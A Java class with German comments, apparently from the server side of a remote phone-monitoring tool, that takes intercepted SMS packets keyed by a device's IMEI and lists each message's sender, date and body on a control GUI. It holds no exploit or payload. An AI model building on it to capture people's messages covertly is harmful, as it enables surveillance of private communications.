package handler;

import server.Server;
import Packet.CallStatusPacket;
import Packet.Packet;
import Packet.ShortSMSPacket;
import gui.GUI;

/**
 * Diese Klasse ist f�r das Empfangen und Verarbeiten von ShortSMSPacket zust�ndig.
 * Diese werden von der SMSMonitor Klasse verwendet.
 */
public class SMSMonitorHandler implements PacketHandler {
	/**
	 * gui Die Benutzeroberfl�che
	 */
	private GUI gui;
	/**
	 * channel Der Datenkanal
	 */
	private int channel;
	/**
	 * imei Die IMEI
	 */
	private String imei;
	
	public SMSMonitorHandler()
	{
		
	}

	/**
	 * Der Konstruktor �bergibt die empfangenen Daten den Klassenvariablen
	 * @param channel	Der Datenkanal
	 * @param imei	Die IMEI
	 * @param gui	Die GUI
	 */
	public SMSMonitorHandler(int channel, String imei, GUI gui) {
		this.gui = gui;
		this.channel = channel;
		this.imei = imei;
	}

	@Override
	public void receive(Packet p, String imei) {
		// TODO Auto-generated method stub
	}

	/**
	 * Diese Methode erstellt eine Lognachricht die sp�ter auf der GUI angezeigt wird.
	 * Danach wir der Speicher des Datenkanals geleert und die addMonitoredSMS Methode aufgerufen um die SMS auf der GUI anzuzeigen.
	 * @param p	Das Paket
	 * @param temp_imei	Eine IMEI
	 * @param c	Der Server
	 */
	@Override
	public void handlePacket(Packet p, String temp_imei, Server c) {
		gui.logTxt("SMS data has been received");
		c.getChannelHandlerMap().get(imei).getStorage(channel).reset();
		ShortSMSPacket packet = (ShortSMSPacket) p;
		gui.addMonitoredSMS(imei, packet.getAddress(), packet.getDate(), packet.getBody());
	}

}
